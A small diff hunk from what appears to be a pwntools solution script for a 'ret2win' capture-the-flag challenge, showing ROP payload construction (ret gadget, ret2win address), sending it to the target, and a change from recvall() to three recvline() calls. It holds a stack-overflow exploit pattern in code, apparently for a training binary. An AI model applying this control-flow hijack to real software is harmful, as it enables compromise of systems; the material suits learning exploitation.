@@ -20,4 +20,6 @@ payload += p64(rop.find_gadget(["ret"]).address)
 payload += p64(e.symbols["ret2win"])
 
 p.sendafter(b"> ", payload)
-p.recvall()
+p.recvline()
+p.recvline()
+p.recvline()
